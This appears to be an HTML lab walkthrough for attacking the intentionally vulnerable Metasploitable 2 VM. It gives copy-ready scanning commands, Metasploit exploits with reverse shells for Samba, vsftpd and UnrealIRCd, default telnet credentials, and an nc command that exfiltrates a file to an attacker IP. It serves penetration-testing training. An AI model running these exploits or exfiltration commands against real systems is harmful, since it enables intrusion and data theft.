<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Metasploitable 2 ‚Äì Complete Lab Walkthrough</title>
  <meta name="description" content="Step-by-step Metasploitable 2 penetration testing walkthrough using Parrot OS and Metasploit, with discovery, exploitation, and data exfiltration techniques." />
  <style>
    :root{
      --bg: #0b0f14;
      --panel: #10161b;
      --text: #e6edf3;
      --muted: #9fb0c3;
      --accent: #58a6ff;
      --accent-2:#7ee787;
      --warn:#f2cc60;
      --danger:#ff7b72;
      --border: #1f2a33;
      --code-bg:#0d1117;
      --code-border:#1f2a33;
      --shadow: 0 10px 30px rgba(0,0,0,.35);
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; background:var(--bg); color:var(--text); font: 16px/1.6 system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
    }
    .app{
      display:grid; grid-template-columns: 280px 1fr; gap:24px; max-width: 1200px; margin:0 auto; padding: 24px;
    }
    header{
      grid-column: 1 / -1; background: linear-gradient(180deg, rgba(88,166,255,.12), transparent 70%);
      border:1px solid var(--border); border-radius:16px; padding:24px; box-shadow:var(--shadow);
    }
    header h1{margin:0 0 6px;font-size: clamp(24px, 4vw, 34px)}
    header p{margin:.25rem 0;color:var(--muted)}
    .toolbar{display:flex; gap:12px; align-items:center; margin-top: 12px}
    .btn{
      display:inline-flex; align-items:center; gap:8px; border:1px solid var(--border); background:var(--panel);
      color:var(--text); padding:8px 12px; border-radius:999px; cursor:pointer; text-decoration:none; box-shadow:var(--shadow);
    }
    .btn:hover{border-color:var(--accent); color:var(--accent)}
    .btn.secondary{opacity:.9}
    .toc{position:sticky; top:18px; align-self:start; background:var(--panel); border:1px solid var(--border); border-radius:16px; padding:18px; box-shadow:var(--shadow)}
    .toc h3{margin:0 0 8px; font-size:14px; letter-spacing:.08em; text-transform:uppercase; color:var(--muted)}
    .toc a{display:block; color:var(--text); text-decoration:none; padding:6px 8px; border-radius:8px}
    .toc a:hover{background:#0f1720; color:var(--accent)}
    main{display:grid; gap:18px}
    section.card{background:var(--panel); border:1px solid var(--border); border-radius:16px; padding:22px; box-shadow:var(--shadow)}
    section.card h2{margin:0 0 12px; font-size: clamp(18px, 3vw, 24px)}
    section.card h3{margin:18px 0 8px; font-size: 18px}
    .callout{border-left:4px solid var(--accent); background: rgba(88,166,255,.08); padding:12px 14px; border-radius:8px; margin: 8px 0}
    .callout.warn{border-left-color:var(--warn); background: rgba(242,204,96,.08)}
    .callout.danger{border-left-color:var(--danger); background: rgba(255,123,114,.08)}
    .grid{display:grid; gap:12px}
    .grid.two{grid-template-columns: repeat(2,minmax(0,1fr))}
    @media (max-width: 960px){.app{grid-template-columns: 1fr}.toc{position:relative}}
    pre{background:var(--code-bg); border:1px solid var(--code-border); border-radius:14px; padding:14px; overflow:auto; position:relative}
    code{font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size:.95rem}
    .codebar{display:flex; justify-content:space-between; align-items:center; gap:6px; margin-bottom:8px}
    .copy-btn{border:1px solid var(--border); background:transparent; color:var(--muted); padding:6px 10px; border-radius:8px; cursor:pointer}
    .copy-btn:hover{color:var(--accent); border-color:var(--accent)}
    details{border:1px dashed var(--border); border-radius:12px; padding:10px 12px; background: rgba(255,255,255,.02)}
    details summary{cursor:pointer; color:var(--accent)}
    table{width:100%; border-collapse:collapse; font-size:.95rem}
    th,td{border-bottom:1px solid var(--border); padding:10px 8px; text-align:left}
    tbody tr:hover{background:#0f1720}
    footer{grid-column:1/-1; color:var(--muted); text-align:center; padding:18px}
    .kbd{display:inline-block; padding:.1rem .4rem; border:1px solid var(--border); border-bottom-width:2px; border-radius:6px; background:#0f1420; font-family:inherit}
    .badge{display:inline-block; font-size:.75rem; padding:.15rem .5rem; border:1px solid var(--border); border-radius:999px; margin-left:.5rem; color:var(--accent-2)}
  </style>
</head>
<body>
  <div class="app">
    <header>
      <h1>Metasploitable 2 ‚Äì Complete Lab Walkthrough <span class="badge">Parrot OS Attacker</span></h1>
      <p>Structured, step‚Äëby‚Äëstep exploit chain with commands you can copy, covering discovery, exploitation (Samba, VSFTPD, UnrealIRCd, Telnet), and post‚Äëexploitation exfiltration.</p>
      <div class="toolbar">
        <button class="btn" id="toggleTheme" aria-label="Toggle theme">üåô Toggle Dark/Light</button>
        <a class="btn secondary" href="#legal">‚öñÔ∏è Legal & Lab Setup</a>
        <a class="btn secondary" href="#summary">üßæ Summary Table</a>
      </div>
    </header>

    <aside class="toc">
      <h3>On this page</h3>
      <nav>
        <a href="#setup">1. Network Discovery</a>
        <a href="#msf">2. Metasploit Workspace</a>
        <a href="#scan">3. Nmap Scanning</a>
        <a href="#samba">4. Samba 3.0.20 (CVE‚Äë2007‚Äë2447)</a>
        <a href="#vsftpd">5. VSFTPD 2.3.4 (CVE‚Äë2011‚Äë2523)</a>
        <a href="#telnet">6. Telnet Weak Creds</a>
        <a href="#unreal">7. UnrealIRCd Backdoor</a>
        <a href="#exfil">8. Data Exfiltration</a>
        <a href="#summary">Summary Table</a>
        <a href="#legal">Legal & Notes</a>
      </nav>
    </aside>

    <main>
      <section id="setup" class="card">
        <h2>1) üîé Network Discovery</h2>
        <div class="callout warn"><strong>Goal:</strong> Identify your attacker IP and the lab subnet, then locate the Metasploitable 2 (M2) host.</div>
        <div class="grid two">
          <div>
            <div class="codebar"><strong>Check attacker interface (Parrot OS)</strong> <button class="copy-btn" data-copy="ifconfig">Copy</button></div>
            <pre><code id="ifconfig">ifconfig</code></pre>
            <p class="muted">Example: Attacker on <code>192.168.56.1</code> ‚Üí Range <code>192.168.56.0/24</code></p>
          </div>
          <div>
            <div class="codebar"><strong>Discover hosts on the range</strong> <button class="copy-btn" data-copy="netdiscover">Copy</button></div>
            <pre><code id="netdiscover">netdiscover -r 192.168.56.0/24</code></pre>
            <p>Look for an entry like <code>192.168.56.109</code> (Metasploitable 2).</p>
          </div>
        </div>
      </section>

      <section id="msf" class="card">
        <h2>2) üöÄ Start Metasploit & Workspace</h2>
        <div class="codebar"><strong>Launch msfconsole and set a workspace</strong> <button class="copy-btn" data-copy="workspace">Copy</button></div>
        <pre><code id="workspace">msfconsole
workspace -a ceh
workspace ceh</code></pre>
        <p>Using a workspace keeps scan/output organized for this engagement.</p>
      </section>

      <section id="scan" class="card">
        <h2>3) ‚ö° Enumerate with Nmap (through Metasploit)</h2>
        <div class="grid two">
          <div>
            <div class="codebar"><strong>Full TCP ports + service detection</strong> <button class="copy-btn" data-copy="dbnmap1">Copy</button></div>
            <pre><code id="dbnmap1">db_nmap -Pn -sV -T4 -p- -v3 192.168.56.109</code></pre>
          </div>
          <div>
            <div class="codebar"><strong>Default scripts + OS detection</strong> <button class="copy-btn" data-copy="dbnmap2">Copy</button></div>
            <pre><code id="dbnmap2">db_nmap -sCV -O -T5 -p- -v3 192.168.56.109</code></pre>
          </div>
        </div>
        <details>
          <summary>Tips for interpreting results</summary>
          <ul>
            <li><strong>Samba 3.0.20</strong> ‚Üí vulnerable to <code>CVE‚Äë2007‚Äë2447</code></li>
            <li><strong>vsftpd 2.3.4</strong> ‚Üí backdoor trigger with <code>:)</code> (CVE‚Äë2011‚Äë2523)</li>
            <li><strong>UnrealIRCd 3.2.8.1</strong> ‚Üí known backdoor</li>
            <li><strong>Telnet</strong> ‚Üí default creds (<code>msfadmin:msfadmin</code>)</li>
          </ul>
        </details>
      </section>

      <section id="samba" class="card">
        <h2>4) üéØ Samba 3.0.20 ‚Äì CVE‚Äë2007‚Äë2447 (usermap_script)</h2>
        <p>Leads to command execution as <code>root</code>.</p>
        <div class="codebar"><strong>Exploit with Metasploit</strong> <button class="copy-btn" data-copy="samba">Copy</button></div>
        <pre><code id="samba">search samba 3.0
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.109
set PAYLOAD cmd/unix/reverse
set LHOST &lt;YOUR_ATTACKER_IP&gt;
run</code></pre>
        <div class="grid two">
          <div>
            <div class="codebar"><strong>Verify shell</strong> <button class="copy-btn" data-copy="verify1">Copy</button></div>
            <pre><code id="verify1">whoami</code></pre>
          </div>
          <div>
            <div class="codebar"><strong>Find the flag</strong> <button class="copy-btn" data-copy="flag">Copy</button></div>
            <pre><code id="flag">find / -name "flag.txt" 2&gt;/dev/null</code></pre>
          </div>
        </div>
      </section>

      <section id="vsftpd" class="card">
        <h2>5) üêü VSFTPD 2.3.4 ‚Äì CVE‚Äë2011‚Äë2523 (Backdoor)</h2>
        <p>Triggers a shell via a crafted username.</p>
        <div class="codebar"><strong>Exploit with Metasploit</strong> <button class="copy-btn" data-copy="vsftpd">Copy</button></div>
        <pre><code id="vsftpd">search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.109
run</code></pre>
        <div class="codebar"><strong>Verify</strong> <button class="copy-btn" data-copy="verify2">Copy</button></div>
        <pre><code id="verify2">whoami</code></pre>
      </section>

      <section id="telnet" class="card">
        <h2>6) üìü Telnet ‚Äì Default Credentials</h2>
        <p>Metasploitable 2 ships with weak defaults.</p>
        <div class="grid two">
          <div>
            <div class="codebar"><strong>Connect</strong> <button class="copy-btn" data-copy="telnet">Copy</button></div>
            <pre><code id="telnet">telnet 192.168.56.109</code></pre>
          </div>
          <div>
            <div class="codebar"><strong>Login (default)</strong> <button class="copy-btn" data-copy="creds">Copy</button></div>
            <pre><code id="creds">user: msfadmin
pass: msfadmin</code></pre>
          </div>
        </div>
        <div class="codebar"><strong>Check user</strong> <button class="copy-btn" data-copy="verify3">Copy</button></div>
        <pre><code id="verify3">whoami</code></pre>
      </section>

      <section id="unreal" class="card">
        <h2>7) üí¨ UnrealIRCd 3.2.8.1 ‚Äì Backdoor</h2>
        <p>Remote command execution as <code>root</code>.</p>
        <div class="codebar"><strong>Exploit with Metasploit</strong> <button class="copy-btn" data-copy="irc">Copy</button></div>
        <pre><code id="irc">search unrealirc
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.109
set PAYLOAD cmd/unix/reverse
set LHOST &lt;YOUR_ATTACKER_IP&gt;
run</code></pre>
        <div class="codebar"><strong>Verify</strong> <button class="copy-btn" data-copy="verify4">Copy</button></div>
        <pre><code id="verify4">whoami</code></pre>
        <p class="callout">Note: ProFTPD exploits on M2 can be unstable‚Äîdocument attempts and results if you try them.</p>
      </section>

      <section id="exfil" class="card">
        <h2>8) üì§ Post‚ÄëExploitation: Data Exfiltration (nc)</h2>
        <div class="grid two">
          <div>
            <div class="codebar"><strong>On attacker (receive)</strong> <button class="copy-btn" data-copy="attackerNc">Copy</button></div>
            <pre><code id="attackerNc">nc -lnvp 4444 &gt; stolen_file</code></pre>
          </div>
          <div>
            <div class="codebar"><strong>On victim (send)</strong> <button class="copy-btn" data-copy="victimNc">Copy</button></div>
            <pre><code id="victimNc">nc &lt;ATTACKER_IP&gt; 4444 &lt; /path/to/file</code></pre>
          </div>
        </div>
      </section>

      <section id="summary" class="card">
        <h2>üßæ Exploit Summary</h2>
        <table>
          <thead>
            <tr>
              <th>Service</th>
              <th>Vulnerability</th>
              <th>CVE</th>
              <th>Expected Result</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Samba 3.0.20</td>
              <td>usermap_script</td>
              <td>CVE‚Äë2007‚Äë2447</td>
              <td><code>root</code></td>
            </tr>
            <tr>
              <td>VSFTPD 2.3.4</td>
              <td>Backdoor via <code>:)</code> username</td>
              <td>CVE‚Äë2011‚Äë2523</td>
              <td><code>root</code></td>
            </tr>
            <tr>
              <td>Telnet</td>
              <td>Default credentials</td>
              <td>‚Äî</td>
              <td><code>msfadmin</code></td>
            </tr>
            <tr>
              <td>UnrealIRCd 3.2.8.1</td>
              <td>Backdoor RCE</td>
              <td>‚Äî</td>
              <td><code>root</code></td>
            </tr>
            <tr>
              <td>ProFTPD</td>
              <td>Unstable/varies</td>
              <td>‚Äî</td>
              <td>Often unreliable</td>
            </tr>
          </tbody>
        </table>
      </section>

      <section id="legal" class="card">
        <h2>‚öñÔ∏è Legal & Lab Notes</h2>
        <div class="callout danger"><strong>Education only.</strong> Perform these steps <em>only</em> on systems you own or have explicit permission to test. Metasploitable 2 is an intentionally vulnerable VM for training labs.</div>
        <ul>
          <li>Replace <code>&lt;YOUR_ATTACKER_IP&gt;</code> / <code>&lt;ATTACKER_IP&gt;</code> placeholders with your actual Parrot OS IP (e.g., <code>192.168.56.1</code>).</li>
          <li>Keep notes of each attempt (success/failure, shell type, user context).</li>
          <li>Export your Metasploit workspace loot for a formal report if needed.</li>
        </ul>
      </section>
    </main>

    <footer>
      ¬© Metasploitable 2 Lab Guide ‚Ä¢ Clean HTML with copy buttons, dark/light theme, and a sticky TOC.
    </footer>
  </div>

  <script>
    // Theme toggle with localStorage
    const toggleBtn = document.getElementById('toggleTheme');
    const applyTheme = (mode)=>{
      if(mode==='light'){
        document.documentElement.style.setProperty('--bg','#f6f8fa');
        document.documentElement.style.setProperty('--panel','#ffffff');
        document.documentElement.style.setProperty('--text','#0b1220');
        document.documentElement.style.setProperty('--muted','#4d6175');
        document.documentElement.style.setProperty('--border','#e3e8ef');
        document.documentElement.style.setProperty('--code-bg','#0d1117');
        document.documentElement.style.setProperty('--code-border','#e3e8ef');
      } else {
        document.documentElement.style.removeProperty('--bg');
        document.documentElement.style.removeProperty('--panel');
        document.documentElement.style.removeProperty('--text');
        document.documentElement.style.removeProperty('--muted');
        document.documentElement.style.removeProperty('--border');
        document.documentElement.style.removeProperty('--code-bg');
        document.documentElement.style.removeProperty('--code-border');
      }
    };
    const saved = localStorage.getItem('theme');
    if(saved) applyTheme(saved);
    toggleBtn.addEventListener('click',()=>{
      const next = (localStorage.getItem('theme')==='light')? 'dark':'light';
      localStorage.setItem('theme', next);
      applyTheme(next);
    });

    // Copy buttons for all code blocks
    const clipboardMap = new Map();
    document.querySelectorAll('[data-copy]').forEach(btn=>{
      const id = btn.getAttribute('data-copy');
      const codeEl = document.getElementById(id);
      clipboardMap.set(btn, codeEl);
      btn.addEventListener('click', async ()=>{
        try{
          await navigator.clipboard.writeText(codeEl.innerText);
          const prev = btn.textContent; btn.textContent = 'Copied!';
          setTimeout(()=> btn.textContent = 'Copy', 1200);
        }catch(e){
          alert('Copy failed. You can still select the text manually.');
        }
      });
    });
  </script>
</body>
</html>
